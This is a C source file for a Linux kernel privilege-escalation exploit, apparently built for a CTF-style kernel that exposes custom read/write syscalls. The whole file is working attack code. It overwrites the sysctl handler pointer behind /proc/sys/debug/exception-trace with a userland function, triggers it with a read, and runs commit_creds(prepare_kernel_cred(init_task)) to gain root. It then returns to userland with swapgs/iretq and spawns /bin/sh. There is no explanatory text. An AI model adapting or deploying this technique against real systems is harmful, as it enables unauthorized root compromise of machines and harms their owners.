// gcc exploit.c -masm=intel -fno-PIE -nostdlib/-static -no-pie -o exploit
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>


uint64_t pwnread(uintptr_t addr);
int pwnwrite(uintptr_t addr, uint64_t val);

ssize_t read(int fd, void *buf, size_t count);
ssize_t write(int fd, const void *buf, size_t count);
int open(const char* pathname, int flags, ...);
int close(int fd);
void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
int mprotect(void *addr, size_t len, int prot);
int munmap(void *addr, size_t length);
int ioctl(int fd, unsigned long request, ...);
int execve(const char *filename, char *const argv[], char *const envp[]);
void exit(int status);

void *memcpy(void *dest, const void *src, size_t n);

static void save_state(void *func);
static void restore_state(void);
static void get_root(void);

/* exploit */
#define __START_KERNEL_map	0xffffffff80000000
#define TEXT_BASE		0xffffffff81000000
#define OFFSET(addr)		((addr) - (TEXT_BASE))
#define ADDR(offset)		(kernel_base + (offset))
#define ADDR_IDT		0xfffffe0000000000

uintptr_t kernel_base = 0;
const uintptr_t ofs_prepare_kernel_cred = OFFSET(0xffffffff8105aac0);
const uintptr_t ofs_commit_creds        = OFFSET(0xffffffff8105a7d0);
const uintptr_t ofs_init_task        	= OFFSET(0xffffffff81c25600);
const uintptr_t ofs_debug_table        	= OFFSET(0xffffffff81c4f5a0);
const uintptr_t ofs_proc_dointvec      	= OFFSET(0xffffffff81044b90);

struct task_struct *init_task;
struct cred *(*prepare_kernel_cred)(struct task_struct *daemon);
int (*commit_creds)(struct cred *new);

static void shell(void);

void _start(void){
	int fd;

	save_state(shell);

	kernel_base = 0xffffffff81000000;
	init_task 		= (void*)ADDR(ofs_init_task);
	prepare_kernel_cred	= (void*)ADDR(ofs_prepare_kernel_cred);
	commit_creds 		= (void*)ADDR(ofs_commit_creds);

	if((fd = open("/proc/sys/debug/exception-trace", O_RDONLY|O_CLOEXEC)) < 0)
		exit(-1);

	pwnwrite(ADDR(ofs_debug_table)+0x20, (uint64_t)get_root);

	// trigger
	read(fd, NULL, 0);

	exit(-2);
}

static void shell(void){
	pwnwrite(ADDR(ofs_debug_table)+0x20, ADDR(ofs_proc_dointvec));	// restore

	execve("/bin/sh", (char*[2]){"sh", NULL}, NULL);
}

/* auxiliary functions */
struct state {
	uint64_t rip;
	uint64_t cs;
	uint64_t rflags;
	uint64_t rsp;
	uint64_t ss;
} stat;

static void save_state(void *func) {
	register void *rsp asm("rsp");

	asm(
	"mov rax, ss\n"
	"push rax\n"
	"lea rax, [rsp+0x18]\n"
	"push rax\n"
	"pushfq\n"
	"mov rax, cs\n"
	"push rax\n"
	"mov rax, [rbp+8]\n"
	"push rax\n"
	);
	memcpy(&stat, rsp, sizeof(stat));
	rsp += sizeof(stat);

	if(func)
		stat.rip = (uint64_t)func;
}

__attribute__((noreturn))
static void restore_state(void){
	register void *rsp asm("rsp");

	rsp -= sizeof(stat);
	memcpy(rsp, &stat, sizeof(stat));
	asm(
	"swapgs\n"
	"iretq\n"
	"hlt_loop:\n"
	"hlt\n"
	"jmp hlt_loop\n"
	);
	__builtin_unreachable();
}

static void get_root(void){
	commit_creds(prepare_kernel_cred(init_task));

	restore_state();
}

/* utils */
void *memcpy(void *dest, const void *src, size_t n){
	for(int i=0; i<n; i++)
		*(char*)(dest+i) = *(char*)(src+i);
	return dest;
}

asm(
"pwnread:\n"
"mov rax, 451\n"
"syscall\n"
"ret\n"

"pwnwrite:\n"
"mov rax, 452\n"
"syscall\n"
"ret\n"

"read:\n"
"mov rax, 0\n"
"syscall\n"
"ret\n"

"write:\n"
"mov rax, 1\n"
"syscall\n"
"ret\n"

"open:\n"
"mov rax, 2\n"
"syscall\n"
"ret\n"

"close:\n"
"mov rax, 3\n"
"syscall\n"
"ret\n"

"mmap:\n"
"mov rax, 9\n"
"mov r10, rcx\n"
"syscall\n"
"ret\n"

"mprotect:\n"
"mov rax, 10\n"
"syscall\n"
"ret\n"

"munmap:\n"
"mov rax, 11\n"
"syscall\n"
"ret\n"

"ioctl:\n"
"mov rax, 16\n"
"syscall\n"
"ret\n"

"execve:\n"
"mov rax, 59\n"
"syscall\n"
"ret\n"

"exit:\n"
"mov rax, 60\n"
"syscall\n"
);

